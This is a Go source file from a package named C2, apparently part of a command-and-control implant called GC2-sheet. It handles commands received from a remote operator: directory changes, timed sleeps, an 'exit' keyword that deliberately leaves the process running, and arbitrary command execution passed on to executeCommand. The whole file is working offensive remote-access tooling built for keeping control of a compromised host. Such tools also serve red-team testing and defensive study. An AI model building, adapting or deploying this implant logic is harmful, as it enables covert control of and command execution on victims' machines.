package C2

import (
	"GC2-sheet/internal/utils"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

func parseTimeFormat(s string) (time.Duration, error) {
	duration, err := time.ParseDuration(s)
	if err == nil {
		return duration, nil
	}
	return parseHHMMSS(s)
}

func parseHHMMSS(s string) (time.Duration, error) {
	parts := strings.Split(s, ":")
	if len(parts) != 3 {
		return 0, fmt.Errorf("invalid format, expected HH:MM:SS")
	}
	hours, errH := strconv.Atoi(parts[0])
	minutes, errM := strconv.Atoi(parts[1])
	seconds, errS := strconv.Atoi(parts[2])
	if errH != nil || errM != nil || errS != nil {
		return 0, fmt.Errorf("invalid time components")
	}
	if hours < 0 || minutes < 0 || minutes >= 60 || seconds < 0 || seconds >= 60 {
		return 0, fmt.Errorf("invalid time values")
	}
	totalSeconds := int64(hours)*3600 + int64(minutes)*60 + int64(seconds)
	return time.Duration(totalSeconds) * time.Second, nil
}

func performCommandExecution(commandToExecute string) (*string, error) {
	trimmedCommand := strings.TrimSpace(commandToExecute)

	if strings.HasPrefix(trimmedCommand, "cd") {
		pathToChange := strings.TrimSpace(strings.TrimPrefix(trimmedCommand, "cd"))
		if pathToChange == "" {
			pathToChange = currentWorkingDir
		}
		if !filepath.IsAbs(pathToChange) {
			pathToChange = filepath.Join(currentWorkingDir, pathToChange)
		}
		pathToChange, err := filepath.Abs(pathToChange)
		if err != nil {
			return nil, fmt.Errorf("failed to resolve path: %w", err)
		}
		info, err := os.Stat(pathToChange)
		if err != nil {
			return nil, fmt.Errorf("failed to change directory: %w", err)
		}
		if !info.IsDir() {
			return nil, fmt.Errorf("not a directory: %s", pathToChange)
		}
		currentWorkingDir = pathToChange
		output := "Directory changed to " + currentWorkingDir
		return &output, nil
	}

	if trimmedCommand == "finish" {
		output := "finish_sleep_prompt"
		return &output, nil
	}

	if trimmedCommand == "sleep" || strings.HasPrefix(trimmedCommand, "sleep ") {
		parts := strings.Fields(trimmedCommand)
		if len(parts) != 2 {
			return nil, fmt.Errorf("invalid sleep syntax: use sleep 10s, 5m, 1h or sleep HH:MM:SS")
		}
		duration, err := parseTimeFormat(parts[1])
		if err != nil {
			return nil, fmt.Errorf("invalid sleep duration: %w", err)
		}
		if duration <= 0 {
			return nil, fmt.Errorf("sleep duration must be greater than zero")
		}
		utils.LogDebug("Sleeping for " + duration.String())
		time.Sleep(duration)
		output := "Sleep completed after " + duration.String()
		return &output, nil
	}

	if strings.HasPrefix(trimmedCommand, "_sleep_confirm ") {
		parts := strings.Fields(trimmedCommand)
		if len(parts) != 2 {
			return nil, fmt.Errorf("invalid format: use _sleep_confirm HH:MM:SS")
		}
		duration, err := parseHHMMSS(parts[1])
		if err != nil {
			return nil, fmt.Errorf("invalid HH:MM:SS format: %w", err)
		}
		if duration <= 0 {
			return nil, fmt.Errorf("sleep duration must be greater than zero")
		}
		utils.LogDebug("Sleeping for " + duration.String())
		time.Sleep(duration)
		output := "Sleep completed after " + duration.String()
		return &output, nil
	}

	splittedCommand := strings.Split(commandToExecute, ";")

	switch splittedCommand[0] {
	case "exit":
		parts := strings.Fields(trimmedCommand)
		if len(parts) == 1 {
			output := "Exit keyword received — process remains alive"
			return &output, nil
		}
		if len(parts) == 2 {
			duration, err := time.ParseDuration(parts[1])
			if err != nil {
				return nil, fmt.Errorf("invalid exit/sleep duration: %w", err)
			}
			if duration <= 0 {
				return nil, fmt.Errorf("duration must be greater than zero")
			}

			utils.LogDebug("Sleeping for " + duration.String() + " after exit keyword")
			time.Sleep(duration)
			output := "Exit keyword completed sleep after " + duration.String()
			return &output, nil
		}
		return nil, fmt.Errorf("invalid exit syntax: use exit or exit 10s")
	}

	output := executeCommand(commandToExecute)
	return &output, nil
}
